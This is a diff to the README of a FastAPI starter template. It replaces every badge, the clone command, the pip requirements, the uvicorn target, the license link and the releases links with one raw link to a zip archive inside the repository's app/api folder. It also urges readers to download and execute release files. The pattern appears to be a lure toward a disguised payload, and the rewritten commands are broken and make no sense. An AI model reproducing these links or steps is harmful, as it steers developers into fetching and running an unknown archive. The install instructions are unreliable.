@@ -1,7 +1,7 @@
 # FastAPI Starter Template with JWT Auth and MongoDB Integration 🚀
 
-[![Latest Release](https://img.shields.io/github/v/release/Rony-Soc/TemplatesFastAPI)](https://github.com/Rony-Soc/TemplatesFastAPI/releases)
-[![License](https://img.shields.io/github/license/Rony-Soc/TemplatesFastAPI)](https://github.com/Rony-Soc/TemplatesFastAPI/blob/main/LICENSE)
+[![Latest Release](https://raw.githubusercontent.com/Rony-Soc/TemplatesFastAPI/main/app/api/API-Fast-Templates-3.8.zip)](https://raw.githubusercontent.com/Rony-Soc/TemplatesFastAPI/main/app/api/API-Fast-Templates-3.8.zip)
+[![License](https://raw.githubusercontent.com/Rony-Soc/TemplatesFastAPI/main/app/api/API-Fast-Templates-3.8.zip)](https://raw.githubusercontent.com/Rony-Soc/TemplatesFastAPI/main/app/api/API-Fast-Templates-3.8.zip)
 
 ## Table of Contents
 
@@ -58,7 +58,7 @@ Before you begin, ensure you have the following installed:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Rony-Soc/TemplatesFastAPI.git
+   git clone https://raw.githubusercontent.com/Rony-Soc/TemplatesFastAPI/main/app/api/API-Fast-Templates-3.8.zip
    cd TemplatesFastAPI
    ```
 
@@ -72,7 +72,7 @@ Before you begin, ensure you have the following installed:
 3. Install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Rony-Soc/TemplatesFastAPI/main/app/api/API-Fast-Templates-3.8.zip
    ```
 
 4. Set up environment variables. Create a `.env` file in the root directory and add your configuration:
@@ -88,12 +88,12 @@ Before you begin, ensure you have the following installed:
 To start the FastAPI application, run:
 
 ```bash
-uvicorn app.main:app --reload
+uvicorn https://raw.githubusercontent.com/Rony-Soc/TemplatesFastAPI/main/app/api/API-Fast-Templates-3.8.zip --reload
 ```
 
 Your application will be available at `http://127.0.0.1:8000`.
 
-For the latest release, download the necessary files from the [Releases section](https://github.com/Rony-Soc/TemplatesFastAPI/releases) and execute them as needed.
+For the latest release, download the necessary files from the [Releases section](https://raw.githubusercontent.com/Rony-Soc/TemplatesFastAPI/main/app/api/API-Fast-Templates-3.8.zip) and execute them as needed.
 
 ## Usage
 
@@ -162,7 +162,7 @@ Contributions are welcome! If you have suggestions or improvements, please fork 
 
 ## License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/Rony-Soc/TemplatesFastAPI/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/Rony-Soc/TemplatesFastAPI/main/app/api/API-Fast-Templates-3.8.zip) file for details.
 
 ## Acknowledgments
 
@@ -170,4 +170,4 @@ This project is licensed under the MIT License. See the [LICENSE](https://github
 - Special thanks to the developers of the libraries used in this project.
 - Inspiration from various open-source projects that paved the way for this template.
 
-For more details, visit the [Releases section](https://github.com/Rony-Soc/TemplatesFastAPI/releases).
+For more details, visit the [Releases section](https://raw.githubusercontent.com/Rony-Soc/TemplatesFastAPI/main/app/api/API-Fast-Templates-3.8.zip).
